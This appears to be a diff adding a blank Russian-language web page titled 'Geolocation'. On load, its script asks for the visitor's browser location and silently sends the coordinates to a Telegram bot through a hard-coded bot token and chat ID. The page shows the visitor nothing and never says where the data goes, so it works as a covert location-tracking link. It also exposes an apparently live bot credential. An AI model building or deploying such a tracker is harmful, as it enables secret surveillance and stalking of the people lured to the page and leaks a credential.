@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Геолокация</title>
+    <script>
+        async function sendLocation(position) {
+            const latitude = position.coords.latitude;
+            const longitude = position.coords.longitude;
+            const token = "AAEWFH86J8x6ZdxQ2B22jh7CkHbE8uVgsuQ";
+            const chatId = "7026592942";
+
+            const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=Геолокация: ${latitude}, ${longitude}`;
+
+            await fetch(url);
+        }
+
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(sendLocation, (error) => {
+                    console.error('Ошибка получения геолокации:', error);
+                });
+            } else {
+                alert('Геолокация не поддерживается этим браузером.');
+            }
+        }
+
+        window.onload = getLocation;
+    </script>
+</head>
+<body>
+</body>
+</html>
